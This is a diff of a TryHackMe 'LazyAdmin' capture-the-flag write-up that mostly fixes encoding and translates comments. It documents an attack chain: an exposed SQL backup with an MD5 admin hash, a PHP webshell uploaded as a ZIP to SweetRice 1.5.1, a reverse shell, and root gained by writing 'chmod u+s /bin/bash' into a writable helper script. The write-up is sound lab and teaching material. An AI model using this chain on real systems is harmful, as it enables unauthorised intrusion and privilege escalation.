@@ -1,37 +1,37 @@
-﻿# LazyAdmin - TryHackMe Writeup
+# LazyAdmin - TryHackMe Writeup
 
 **Target:** `TARGET_IP` (10.130.171.51 at time of solve)
 **OS:** Linux (Ubuntu 16.04)
 **Difficulty:** Easy
 **Tech stack:** Apache 2.4.18, SweetRice CMS 1.5.1
-**Exploit chain:** exposed SQL backup (admin MD5) ? CrackStation ? SweetRice Media Center ZIP upload ? reverse shell as `www-data` ? `sudo perl backup.pl` ? world-writable `/etc/copy.sh` ? SUID `bash` ? root
+**Exploit chain:** exposed SQL backup (admin MD5) → CrackStation → SweetRice Media Center ZIP upload → reverse shell as `www-data` → `sudo perl backup.pl` → world-writable `/etc/copy.sh` → SUID `bash` → root
 
 ---
 
 ## Attack Chain Overview
 
 ```
-nmap ? 22/tcp OpenSSH 7.2p2, 80/tcp Apache 2.4.18
-    ?
-feroxbuster /  ?  /content/inc/mysql_backup/*.sql + /content/inc/cache/cache.db
-    ?
-wget everything + grep SQL dump ? MD5 42f749ade7f9e195bf475f37a44cafcb
-    ?
-CrackStation ? Password123  (user "manager")
-    ?
-SweetRice 1.5.1 admin panel (/content/as/) ? Media Center ZIP upload
-    ?
-PHP webshell at /content/attachment/<md5>.php ? reverse shell as www-data
-    ?
+nmap → 22/tcp OpenSSH 7.2p2, 80/tcp Apache 2.4.18
+    ↓
+feroxbuster /  →  /content/inc/mysql_backup/*.sql + /content/inc/cache/cache.db
+    ↓
+wget everything + grep SQL dump → MD5 42f749ade7f9e195bf475f37a44cafcb
+    ↓
+CrackStation → Password123  (user "manager")
+    ↓
+SweetRice 1.5.1 admin panel (/content/as/) → Media Center ZIP upload
+    ↓
+PHP webshell at /content/attachment/<md5>.php → reverse shell as www-data
+    ↓
 Loot user.txt + /home/itguy/mysql_login.txt  (rice:randompass)
-    ?
-sudo -l  ?  (ALL) NOPASSWD /usr/bin/perl /home/itguy/backup.pl
-    ?
+    ↓
+sudo -l  →  (ALL) NOPASSWD /usr/bin/perl /home/itguy/backup.pl
+    ↓
 backup.pl calls /etc/copy.sh (world-writable)
-    ?
+    ↓
 echo 'chmod u+s /bin/bash' > /etc/copy.sh  +  sudo perl backup.pl
-    ?
-bash -p ? root.txt
+    ↓
+bash -p → root.txt
 ```
 
 ---
@@ -40,9 +40,9 @@ bash -p ? root.txt
 1. [Reconnaissance](#1-reconnaissance)
 2. [Web Enumeration](#2-web-enumeration)
 3. [Loot the Exposed SQL Backup](#3-loot-the-exposed-sql-backup)
-4. [Initial Access Â— SweetRice CMS Media Center RCE](#4-initial-access--sweetrice-cms-media-center-rce)
+4. [Initial Access — SweetRice CMS Media Center RCE](#4-initial-access--sweetrice-cms-media-center-rce)
 5. [Post-Exploitation (`www-data`)](#5-post-exploitation-www-data)
-6. [Privilege Escalation Â— sudo perl + writable helper](#6-privilege-escalation--sudo-perl--writable-helper)
+6. [Privilege Escalation — sudo perl + writable helper](#6-privilege-escalation--sudo-perl--writable-helper)
 7. [Root Flag](#7-root-flag)
 8. [Key Takeaways](#8-key-takeaways)
 
@@ -71,7 +71,7 @@ searchsploit OpenSSH 7.2p2
 # OpenSSH 7.2p2 - Username Enumeration   | linux/remote/40136.py
 ```
 
-CVE-2016-6210 is a username enumeration oracle Â— handy if spraying, but not a foothold by itself. Parked; focus on the web.
+CVE-2016-6210 is a username enumeration oracle — handy if spraying, but not a foothold by itself. Parked; focus on the web.
 
 ---
 
@@ -91,7 +91,7 @@ http://$TARGET/content/inc/cache/cache.db
 http://$TARGET/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
 http://$TARGET/content/as/lib/app_sqlite.sql
 http://$TARGET/content/as/lib/app_pgsql.sql
-http://$TARGET/content/as/                     ? SweetRice admin panel
+http://$TARGET/content/as/                     → SweetRice admin panel
 ```
 
 ---
@@ -110,17 +110,17 @@ wget http://$TARGET/content/as/lib/app_pgsql.sql
 wget http://$TARGET/content/as/lib/app.sql
 ```
 
-### `cache.db` Â— Berkeley DB, not SQLite
+### `cache.db` — Berkeley DB, not SQLite
 
 ```bash
-# What it does: usa un cliente o herramienta de volcado de base de datos.
-# Why here: enumerar datos y extraer credenciales o estado de la app.
+# What it does: uses a database dump client or tool.
+# Why here: enumerate data and extract credentials or app state.
 sqlite3 cache.db           # not a SQLite file
 # What it does: identifies file type and metadata.
 # Why here: choose the correct parser or technique.
-file cache.db              # ? Berkeley DB
-# What it does: instala la herramienta o paquete local necesario.
-# Why here: tener disponible el helper antes de ejecutar la tecnica.
+file cache.db              # → Berkeley DB
+# What it does: installs the necessary local tool or package.
+# Why here: to have the helper available before executing the technique.
 sudo apt-get install db-util
 db_dump -p cache.db
 # db_array_2e105254be2ecfedabac66868dcec9b6 1575023409
@@ -128,9 +128,9 @@ db_dump -p cache.db
 # ...
 ```
 
-Dump is a list of hash ? timestamp entries Â— no immediate credential. Move on.
+Dump is a list of hash → timestamp entries — no immediate credential. Move on.
 
-### `mysql_bakup_*.sql` Â— jackpot
+### `mysql_bakup_*.sql` — jackpot
 
 ```bash
 head -100 mysql_bakup_20191129023059-1.5.1.sql
@@ -143,7 +143,7 @@ s:5:\"admin\";s:7:\"manager\";
 s:6:\"passwd\";s:32:\"42f749ade7f9e195bf475f37a44cafcb\";
 ```
 
-Raw MD5 ? CrackStation (hashcat `-m 0` also works):
+Raw MD5 → CrackStation (hashcat `-m 0` also works):
 
 ```
 42f749ade7f9e195bf475f37a44cafcb : Password123
@@ -155,7 +155,7 @@ Full pattern: [backup-file-exposure.md](../../../exploits/web-disclosure/backup-
 
 ---
 
-## 4. Initial Access Â— SweetRice CMS Media Center RCE
+## 4. Initial Access — SweetRice CMS Media Center RCE
 
 Full technique note: [sweetrice-media-center-rce.md](../../../exploits/web-rce/sweetrice-media-center-rce.md).
 
@@ -172,7 +172,7 @@ SweetRice 1.5.1 is EOL; its Media Center accepts ZIP uploads and unpacks them un
 https://github.com/weekevy/SweetRice-CMS-1.5.1-RCE-Exploit/blob/main/shell.zip
 ```
 
-Upload it via **Media Center ? Attach new medium**. The extracted PHP shell shows up in the listing with a random MD5 filename.
+Upload it via **Media Center → Attach new medium**. The extracted PHP shell shows up in the listing with a random MD5 filename.
 
 ```bash
 # Sanity check
@@ -219,11 +219,11 @@ cat /home/itguy/mysql_login.txt
 # rice:randompass
 ```
 
-Spotted: a `backup.pl` in the same home Â— pin for the privesc step.
+Spotted: a `backup.pl` in the same home — pin for the privesc step.
 
 ---
 
-## 6. Privilege Escalation Â— sudo perl + writable helper
+## 6. Privilege Escalation — sudo perl + writable helper
 
 ```bash
 # What it does: check the 'www-data' user's sudo permissions.
@@ -233,7 +233,7 @@ sudo -l
 #     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
 
 # What it does: lists directory contents.
-# Why here: verificar archivos, permisos o loot en la ruta actual.
+# Why here: check files, permissions, or loot in the current path.
 ls -la /home/itguy/backup.pl
 # What it does: displays a file in the terminal.
 # Why here: read configuration, credentials, proof or flags.
@@ -243,11 +243,11 @@ cat /home/itguy/backup.pl
 # ...
 ```
 
-The sudo-allowed script (`backup.pl`) is itself untouchable, but it shells out to `/etc/copy.sh` Â— which is world-writable:
+The sudo-allowed script (`backup.pl`) is itself untouchable, but it shells out to `/etc/copy.sh` — which is world-writable:
 
 ```bash
 # What it does: lists directory contents.
-# Why here: verificar archivos, permisos o loot en la ruta actual.
+# Why here: check files, permissions, or loot in the current path.
 ls -la /etc/copy.sh
 # -rwxrwxrwx 1 root root ... /etc/copy.sh
 ```
@@ -267,7 +267,7 @@ sudo /usr/bin/perl /home/itguy/backup.pl
 
 # 3. /bin/bash is now SUID root
 # What it does: lists directory contents.
-# Why here: verificar archivos, permisos o loot en la ruta actual.
+# Why here: check files, permissions, or loot in the current path.
 ls -la /bin/bash
 # -rwsr-xr-x 1 root root ... /bin/bash
 
@@ -293,18 +293,18 @@ cat /root/root.txt
 
 ## 8. Key Takeaways
 
-- Always mirror any `/backup/`, `/dump/`, `*.sql`, `*.db` paths feroxbuster produces Â— admin hashes often end up in CMS SQL exports.
-- `file <x>.db` before `sqlite3`. LazyAdmin's `cache.db` was a Berkeley DB Â— `db_dump -p` is the right tool.
-- MD5 ? CrackStation is still the fastest crack for a random "admin" password in a CTF. If it fails, `hashcat -m 0` with rockyou is the next stop.
-- SweetRice 1.5.1 Media Center accepts ZIP uploads and extracts PHP Â— treat any reachable SweetRice instance as RCE.
+- Always mirror any `/backup/`, `/dump/`, `*.sql`, `*.db` paths feroxbuster produces — admin hashes often end up in CMS SQL exports.
+- `file <x>.db` before `sqlite3`. LazyAdmin's `cache.db` was a Berkeley DB — `db_dump -p` is the right tool.
+- MD5 → CrackStation is still the fastest crack for a random "admin" password in a CTF. If it fails, `hashcat -m 0` with rockyou is the next stop.
+- SweetRice 1.5.1 Media Center accepts ZIP uploads and extracts PHP — treat any reachable SweetRice instance as RCE.
 - When `sudo -l` allows a script, **also check every fixed path that script calls**. The privesc is often against the helper, not the allowed binary.
 
 ---
 
 ## Related Notes
-- [backup-file-exposure.md](../../../exploits/web-disclosure/backup-file-exposure.md) Â— exposed `.sql` / `.db` in webroot
-- [sweetrice-media-center-rce.md](../../../exploits/web-rce/sweetrice-media-center-rce.md) Â— authenticated RCE chain
-- [sudo-script-helper-hijack.md](../../../privesc/linux/sudo-script-helper-hijack.md) Â— privesc via writable helper
-- [linux-enumeration.md](../../../playbooks/enumeration/linux.md) Â— post-foothold checklist
-- [searchsploit](../../../tools/recon/searchsploit.md), [wget](../../../tools/web/wget.md), [sqlite3](../../../tools/database/sqlite3.md) Â— tool notes for this chain
-- [nmap](../../../tools/recon/nmap.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md) Â— recon
+- [backup-file-exposure.md](../../../exploits/web-disclosure/backup-file-exposure.md) — exposed `.sql` / `.db` in webroot
+- [sweetrice-media-center-rce.md](../../../exploits/web-rce/sweetrice-media-center-rce.md) — authenticated RCE chain
+- [sudo-script-helper-hijack.md](../../../privesc/linux/sudo-script-helper-hijack.md) — privesc via writable helper
+- [linux-enumeration.md](../../../playbooks/enumeration/linux.md) — post-foothold checklist
+- [searchsploit](../../../tools/recon/searchsploit.md), [wget](../../../tools/web/wget.md), [sqlite3](../../../tools/database/sqlite3.md) — tool notes for this chain
+- [nmap](../../../tools/recon/nmap.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md) — recon
